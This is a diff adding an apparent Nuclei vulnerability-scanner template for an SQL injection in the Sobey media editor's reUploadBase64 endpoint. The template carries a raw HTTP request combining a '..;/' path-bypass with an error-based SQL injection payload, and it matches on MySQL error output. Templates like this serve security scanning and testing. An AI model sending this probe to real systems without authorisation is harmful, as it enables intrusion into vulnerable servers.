@@ -1,0 +1,32 @@
+id: sobeylingyun-reUploadBase64-sqli
+info:
+  name: 索贝融媒体 /sobey-mchEditor/mch/TestInt/reUploadBase64 SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/ah9c6tpgs5ynfdfm
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: sobeylingyun,sqli
+
+http:
+  - raw:
+      - |
+        GET /sobey-mchEditor/js/..;/mch/TestInt/reUploadBase64?ids=1')+AND+(SELECT+1+FROM+nonexistent_table)--+-&siteCode=1&token=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Length: 2
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - contains_all(body,'MySQLSyntaxErrorException')
+        condition: and
